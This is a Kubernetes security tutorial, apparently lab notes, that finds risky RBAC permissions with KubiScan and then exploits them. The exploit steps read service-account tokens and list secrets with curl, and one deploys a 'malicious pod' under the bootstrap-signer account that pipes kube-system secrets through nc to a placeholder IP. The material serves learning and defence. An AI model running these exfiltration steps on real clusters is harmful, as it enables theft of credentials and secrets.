# Finding objects with risky permissions

```sh
git clone git@github.com:cyberark/KubiScan.git
cd KubiScan
./docker_run.sh ~/.kube/config
```

```sh
kubiscan --risky-roles -r
kubiscan --risky-clusterroles -r
kubiscan --risky-rolebindings
kubiscan --risky-clusterrolebindings

kubiscan --risky-subjects # Users, Groups or Service Accounts

kubiscan --risky-pods
kubiscan --dump-tokens # Dump tokens from pod\pods

kubiscan --associated-any-rolebindings-role "system:controller:token-cleaner" -ns "kube-system"
kubiscan --associated-any-rolebindings-clusterrole "cluster-admin"
kubiscan --associated-any-rolebindings-subject "system:masters" -k "Group"
kubiscan --associated-any-roles-subject "generic-garbage-collector" -k "ServiceAccount" -ns "kube-system"
kubiscan -aars "system:authenticated" -k "Group"

# Show Pods that has access to the secret data through a Volume
kubiscan --pods-secrets-volume

# Show Pods that has access to the secret data through environment variables
kubiscan --pods-secrets-env
```

# Exploiting risky permissions

```sh
alias k='kubectl'
```

## Pod with permission to list secrets

An attacker that gains access to the JWT token that is associated with account
that has permissions to list secrets, can use curl to get all secrets in a
namespace (or the whole cluster if clusterrolebinding was used). This way an
attacker can grab usernames and passwords for applications or databases, SSH
keys, more priveleged users' tokens or other secrets.

Create a secret that we'll try to get:

```sh
k create secret generic mypassword --from-literal password=s3cret!
```

Create a pod that can list secrets:

```sh
# Service account that can read secrets in the namespace.
k create sa secrets-reader
k create role read-secrets --resource secrets --verb list
k create rolebinding secrets-reader --serviceaccount default:secrets-reader --role read-secrets

# Pod using the service account.
cat <<EOF | k apply -f -
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: nginx
  name: nginx
spec:
  serviceAccount: secrets-reader
  containers:
  - image: nginx
    name: nginx
  dnsPolicy: ClusterFirst
  restartPolicy: Always
EOF
```

Get all the secrets in a namespace through the pod:

```sh
cat <<'EOF' | k exec -i nginx -- bash | jq -r '.items[].data.password' | base64 -d
APISERVER=https://kubernetes.default.svc
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
TOKEN=$(cat ${SERVICEACCOUNT}/token)
CACERT=${SERVICEACCOUNT}/ca.crt
URLPATH=${APISERVER}/api/v1/namespaces/default/secrets
curl -s --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" $URLPATH
EOF
```

## Pod with permissions to create pods in kube-system namespace

NOTE: works only for Kuberentes v1.20 and lower. After that bound service
accounts are used.

Run kind cluster with v1.20:

```sh
cat <<EOF > kind-config.yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
networking:
  apiServerAddress: "127.0.0.1"
  apiServerPort: 6443
nodes:
- role: control-plane
  image: kindest/node:v1.20.15@sha256:a32bf55309294120616886b5338f95dd98a2f7231519c7dedcec32ba29699394
EOF
kind create cluster --config kind-config.yaml
```

Create pod that can create pods:

```sh
SA="sa3"
NS="kube-system"

k create role create-pods --resource pods --verb create
k create sa $SA -n=$NS
k create rolebinding create-pods -n=$NS --role=create-pods --serviceaccount="$NS:$SA"

# Get token of sa3 service account.
SECRET=$(k get sa $SA -n $NS -o json | jq -r '.secrets[].name')
TOKEN=$(k get secrets $SECRET -n=$NS -o json | jq -r '.data.token' | base64 -d)
```

Exfiltrate all secrets from the namespace:

```sh
# First, try to list secrets, you should get 403 - forbidden.
curl -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://127.0.0.1:6443/api/v1/namespaces/kube-system/secrets

# Malicious pod uses privileged account bootstrap-signer and its token to list secrets and send them out of the cluster :-0.
cat <<'EOF' > malicious-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: alpine
  name: alpine
  namespace: kube-system
spec:
  containers:
  - image: alpine
    name: alpine
    command: ["/bin/sh"]
    args: ["-c", "apk update && apk add curl --no-cache && curl -k -v -H \"Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)\" -H 'Content-Type: application/json' https://127.0.0.1:6443/api/v1/namespaces/kube-system/secrets | nc <IP_ADDRES> 6666"]
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
  dnsPolicy: ClusterFirst
  restartPolicy: Never
EOF

# Convert yaml to json.
yq -o=json malicious-pod.yaml > malicious-pod.json

# In a different terminal window.
nc -l 6666

# Exfiltrate kube-system secrets.
curl -k -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://127.0.0.1:6443/api/v1/namespaces/kube-system/pods -d @malicious-pod.json
```